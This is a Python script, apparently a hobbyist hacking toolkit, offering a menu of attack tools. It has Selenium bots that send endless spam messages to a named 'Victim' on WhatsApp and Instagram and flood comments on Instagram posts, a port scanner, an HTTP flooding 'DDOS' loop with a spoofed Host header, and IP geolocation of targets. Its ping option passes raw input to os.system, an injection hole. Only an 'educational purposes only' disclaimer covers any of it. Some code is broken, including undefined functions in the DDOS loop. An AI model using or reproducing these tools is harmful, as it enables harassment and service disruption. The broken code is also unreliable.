from selenium import webdriver
from datetime import datetime
from time import sleep
import sys
import socket
import _thread
import time
import os
import threading
import random
import string
import socket as s
import json
import requests


print( '''
  
░██████╗██╗░░██╗██╗██████╗░░░░██████╗░██╗░░░██╗
██╔════╝██║░██╔╝██║██╔══██╗░░░██╔══██╗╚██╗░██╔╝
╚█████╗░█████═╝░██║██║░░██║░░░██████╔╝░╚████╔╝░
░╚═══██╗██╔═██╗░██║██║░░██║░░░██╔═══╝░░░╚██╔╝░░
██████╔╝██║░╚██╗██║██████╔╝██╗██║░░░░░░░░██║░░░
╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝╚═╝░░░░░░░░╚═╝░░░
By: Liam Wood
Follow in instagram: https://www.instagram.com/_python.exe_/?hl=es
Github: https://github.com/Shutdown-exe/skid/blob/master/README.md
                                             ''')
print('this is for educational purposes only, i am not responsible for your actions.')

print("_" * 50)
print("1: What's app Bomber")
print("2: Instagram DM Bomber")
print("3: Instagram post Bomber")
print("4: port scanner")
print("5: ping scanner")
print("6: DDOS")
print("7: website IP graber")
print("8. IP tracker")
print("_" * 50)

options=int (input ("Enter Number: "))
if options == 1 :
    print('''
                             \|/
                               `--+--'
                                  |
                              ,--'#`--.
                              |#######|
                           _.-'#######`-._
                        ,-'###############`-.
                      ,'#####################`,       
                     |#########################|          What's App Bomber Spammer
                    |###########################|         
                   |#############################|
                   |#############################|             
                   |#############################|        
                    |###########################|
                     \#########################/          
                      `.#####################,'
                        `._###############_,'
                           `--..#####..--'                           ''')

    browser = webdriver.Chrome()
    browser.get('https://web.whatsapp.com')

    sleep(5)

    browser.find_element_by_css_selector("span[title='" + input("Enter name to spam: ") + "']").click()
    inputString = input("Enter message to send: ")
    while (True):
        browser.find_element_by_xpath('//*[@id="main"]/footer/div[1]/div[2]/div/div[2]').send_keys(inputString)
        browser.find_element_by_xpath('//*[@id="main"]/footer/div[1]/div[3]/button').click()
        print("Sending messages")


if options == 2 :
    print('''
      ▄█████████████████████████▄
    ▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
    ███████████▀▀░░░░░▀▀███████████
    █░░░░░░░██░░▄█████▄░░██░░░░░░░█
    █░░░░░░░██░██▀░░░▀██░██░░░░░░░█       Instagram Spammer 
    █░░░░░░░██░██░░░░░██░██░░░░░░░█
    █░░░░░░░██░██▄░░░▄██░██░░░░░░░█    
    █░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
    █░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
    █░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█       By: Liam Wood
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    ▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
    ──▀█████████████████████████▀──  
                                                 ''')

    browser = webdriver.Chrome()

    browser.get('https://www.instagram.com/')

    text = input("Enter user name: ")
    while (True):
        browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input').send_keys(text)
        browser.find_element_by_xpath(
            '//*[@id="loginForm"]/div/div[2]/div/label/input').click()
        text = input("Enter user password: ")
        browser.find_element_by_xpath(
            '//*[@id="loginForm"]/div/div[2]/div/label').send_keys(text)
        browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]/button')
        browser.find_element_by_xpath(
            '//*[@id="loginForm"]/div/div[3]/button').click()
        while (True):
            sleep(10)
            browser.find_element_by_xpath('//*[@id="react-root"]/section/nav/div[2]/div/div/div[3]/div/div[2]/a').click()

            sleep(3)

            browser.find_element_by_xpath('/html/body/div[4]/div/div/div/div[3]/button[2]')
            browser.find_element_by_xpath('/html/body/div[4]/div/div/div/div[3]/button[2]').click()

            sleep(3)

            browser.find_element_by_xpath('//*[@id="react-root"]/section/div/div[2]/div/div/div[2]/div/button')
            browser.find_element_by_xpath('//*[@id="react-root"]/section/div/div[2]/div/div/div[2]/div/button').click()
            while (True):
                text = input("Enter Victim: ")
                browser.find_element_by_xpath('/html/body/div[4]/div/div/div[2]/div[1]/div/div[2]/input').send_keys(text)
                sleep(3)
                browser.find_element_by_xpath('/html/body/div[4]/div/div/div[2]/div[2]/div[1]/div/div[1]').click()
                browser.find_element_by_xpath('/html/body/div[4]/div/div/div[1]/div/div[2]').click()
                inputString = input("Enter message to send: ")
                while (True):
                    browser.find_element_by_xpath(
                        '//*[@id="react-root"]/section/div/div[2]/div/div/div[2]/div[2]/div/div[2]/div/div/div[2]/textarea').send_keys(
                        inputString)
                    browser.find_element_by_xpath(
                        '//*[@id="react-root"]/section/div/div[2]/div/div/div[2]/div[2]/div/div[2]/div/div/div[3]/button').click()
                    print("Sending messages")

if options == 3 :
    print('''

    ██████╗░░█████╗░░██████╗████████╗  ░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░
    ██╔══██╗██╔══██╗██╔════╝╚══██╔══╝  ██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗
    ██████╔╝██║░░██║╚█████╗░░░░██║░░░  ╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝
    ██╔═══╝░██║░░██║░╚═══██╗░░░██║░░░  ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗
    ██║░░░░░╚█████╔╝██████╔╝░░░██║░░░  ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║
    ╚═╝░░░░░░╚════╝░╚═════╝░░░░╚═╝░░░  ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝
                                   ''')

    browser = webdriver.Chrome()

    browser.get('https://www.instagram.com/')
    text = input("Enter user name: ")
    while (True):
        browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input').send_keys(text)
        browser.find_element_by_xpath(
            '//*[@id="loginForm"]/div/div[2]/div/label/input').click()
        text = input("Enter user password: ")
        browser.find_element_by_xpath(
            '//*[@id="loginForm"]/div/div[2]/div/label').send_keys(text)
        browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]/button')
        browser.find_element_by_xpath(
            '//*[@id="loginForm"]/div/div[3]/button').click()
        text = input("Victim: ")
        browser.find_element_by_xpath('//*[@id="react-root"]/section/nav/div[2]/div/div/div[2]/div/div').click()
        browser.find_element_by_xpath('//*[@id="react-root"]/section/nav/div[2]/div/div/div[2]/input').send_keys(text)
        sleep(4)
        browser.find_element_by_xpath(
            '//*[@id="react-root"]/section/nav/div[2]/div/div/div[2]/div[3]/div[2]/div/a[1]').click()
        while (True):
            print("Choose a post")
            print("you have 10 sec to chose")
            sleep(10)
            print('''

                 . . .                         
                  \|/                          
                `--+--'                        
                  /|\                          
                 ' | '                         
                   |                           
                   |                           
               ,--'#`--.                       
               |#######|                       
            _.-'#######`-._                    
         ,-'###############`-.                 
       ,'#####################`,               
      /#########################\              
     |###########################|             
    |#############################|            
    |#############################|            
    |#############################|            
    |#############################|            
     |###########################|             
      \#########################/              
       `.#####################,'               
         `._###############_,'                 
            `--..#####..--'
                                           ''')
            text = input("Message: ")
            while (True):
                print("_" * 50)
                print("Spamming Now...")
                print("time started" + str(datetime.now()))
                print("_" * 50)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                print("sleeping for 120 sec")
                sleep(120)

                print("_" * 50)
                print("Spamming Now...")
                print("time started" + str(datetime.now()))
                print("_" * 50)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                print("sleeping for 200 sec")
                sleep(200)

                print("_" * 50)
                print("Spamming Now...")
                print("time started" + str(datetime.now()))
                print("_" * 50)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                print("sleeping for 200 sec")
                sleep(200)

                print("_" * 50)
                print("Spamming Now...")
                print("time started" + str(datetime.now()))
                print("_" * 50)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                print("sleeping for 400 sec")
                sleep(400)

                print("_" * 50)
                print("Spamming Now...")
                print("time started" + str(datetime.now()))
                print("_" * 50)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                print("sleeping for 400 sec")
                sleep(400)

                print("_" * 50)
                print("Spamming Now...")
                print("time started" + str(datetime.now()))
                print("_" * 50)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                sleep(3)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/textarea').send_keys(text)
                browser.find_element_by_xpath(
                    '/html/body/div[4]/div[2]/div/article/div[3]/section[3]/div/form/button').click()
                print("Exiting...")
                sys.exit()

if options == 4 :
    print('''
         
██████╗░░█████╗░██████╗░████████╗  ░██████╗░█████╗░░█████╗░███╗░░██╗███╗░░██╗███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝  ██╔════╝██╔══██╗██╔══██╗████╗░██║████╗░██║██╔════╝██╔══██╗
██████╔╝██║░░██║██████╔╝░░░██║░░░  ╚█████╗░██║░░╚═╝███████║██╔██╗██║██╔██╗██║█████╗░░██████╔╝
██╔═══╝░██║░░██║██╔══██╗░░░██║░░░  ░╚═══██╗██║░░██╗██╔══██║██║╚████║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░╚█████╔╝██║░░██║░░░██║░░░  ██████╔╝╚█████╔╝██║░░██║██║░╚███║██║░╚███║███████╗██║░░██║
╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
                                                    ''')

    target = input('Choose IP: ')

    if len(sys.argv) == 2:
        target = socket.gethostbyname(sys.argv[1])

    print("_" * 50)
    print("Scanning for target-" + target)
    print("time started-" + str(datetime.now()))
    print("_" * 50)

    try:
        for port in range(1, 65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print("port {} is open".format(port))
            s.close()

    except keyboardInturrupt:
        print("/n Exiting program.")
        sys.exit()

    except socket.gaierror:
        print("Hostname could not be resolved")
        sys.exit()

    except socket.error:
        print("couldn't connect to server")
        sys.exit()

if options == 5 :
    print('''
██╗██████╗░██╗███╗░░██╗░██████╗░██╗
██║██╔══██╗██║████╗░██║██╔════╝░██║
██║██████╔╝██║██╔██╗██║██║░░██╗░██║
╚═╝██╔═══╝░██║██║╚████║██║░░╚██╗╚═╝
██╗██║░░░░░██║██║░╚███║╚██████╔╝██╗
╚═╝╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝

    
                                                        ''')

    print('-' * 60)
    ip_to_check = input('ip: ')

    print('-' * 60)
    os.system('ping {}'.format(ip_to_check))

    print('-' * 60)

if options == 6 :


    print('''
                                                            
         _,.-------.,_
     ,;~'             '~;,
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; |
|  `/~"     ~" . "~     "~\'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   |
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~.
 |     ---;' / | \ `;---     |
  \__.       \/^\/       .__/
   V| \                 / |V
    | |T~\___!___!___/~T| |
    | |`IIII_I_I_I_IIII'| |
    |  \,III I I I III,/  |
     \   `~~~~~~~~~~'    /
       \   .       .   /     
         \.    ^    ./
           ^~~~^~~~^                                 
                                                                    

                                            ╭━━━┳━━━┳━━━┳━━━╮
                                            ╰╮╭╮┣╮╭╮┃╭━╮┃╭━╮┃
                                            ╱┃┃┃┃┃┃┃┃┃╱┃┃╰━━╮
                                            ╱┃┃┃┃┃┃┃┃┃╱┃┣━━╮┃
                                            ╭╯╰╯┣╯╰╯┃╰━╯┃╰━╯┃
                                            ╰━━━┻━━━┻━━━┻━━━╯
                                                            ''')

    target = input('Input IP: ')
    port = 80
    fake_ip = input('Choose fake IP: ')
    num = input('place any number, recomended is 1000: ')
    print("_" * 50)
    print("DDOS started...")
    print("time started" + str(datetime.now()))
    print("_" * 50)

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global attack_num
        attack_num += 1
        print(attack_num)

        for i in range(num):
            thread = threading.Thread(target=attack)
            thread.start()

if options == 7 :
    print('''

        
█████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░██████░░░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀░░██████████░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░██████░░▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██████████░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░██████░░░░▄▀░░░░█░░▄▀░░░░░░▄▀░░█
█░░▄▀░░██████████░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░████████░░▄▀░░███░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░░░░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░██████░░▄▀░░███░░▄▀░░░░░░▄▀░░█
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░██████░░▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░██████░░▄▀░░███░░▄▀░░░░░░░░░░█
█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░████░░▄▀░░██████░░▄▀░░███░░▄▀░░█████████
█░░▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░████░░░░▄▀░░░░█░░▄▀░░█████████
█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░████░░▄▀▄▀▄▀░░█░░▄▀░░█████████
█░░░░░░██░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░████░░░░░░░░░░█░░░░░░█████████
█████████████████████████████████████████████████████████████████████████████████████
                                                                ''')

    host = input("input website: ")
    print(f"IP Address of {host} is {s.gethostbyname(host)}")

if options == 8 :
    print('''


    
                                          
╔══╦═══╗─╔╗────────╔╗
╚╣╠╣╔═╗║╔╝╚╗───────║║
─║║║╚═╝║╚╗╔╬═╦══╦══╣║╔╗
─║║║╔══╝─║║║╔╣╔╗║╔═╣╚╝╝
╔╣╠╣║────║╚╣║║╔╗║╚═╣╔╗╗
╚══╩╝────╚═╩╝╚╝╚╩══╩╝╚╝                                          

   

                                                                    ''')

    ip_address = input("Input IP: ")

    response = requests.get(f'http://ip-api.com/json/{ip_address}').content
    data = json.loads(response)

    print(f''' 
    IP: {data['query']}
    Country: {data['country']}
    City: {data['city']}
    ZIP: {data['zip']}
    ISP: {data['isp']}
           
        ''')

